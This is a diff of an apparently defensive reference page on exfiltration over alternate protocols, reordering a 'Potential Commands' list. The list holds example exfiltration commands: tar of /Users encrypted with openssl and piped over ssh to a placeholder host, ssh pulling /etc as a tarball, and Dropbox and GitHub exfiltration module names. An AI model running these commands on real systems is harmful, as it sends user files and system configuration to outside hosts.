@@ -31,17 +31,11 @@ Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network pr
 ## Potential Commands
 
 ```
-ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
-
-tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh atomic@#{domain} 'cat > /Users.tar.gz.enc'
-
-tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
-
 tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@target.example.com 'cat > /Users.tar.gz.enc'
-
+tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
+tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh atomic@#{domain} 'cat > /Users.tar.gz.enc'
+ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
 powershell/exfiltration/exfil_dropbox
-powershell/exfiltration/exfil_dropbox
-exfiltration/Invoke_ExfilDataToGitHub
 exfiltration/Invoke_ExfilDataToGitHub
 ```
 
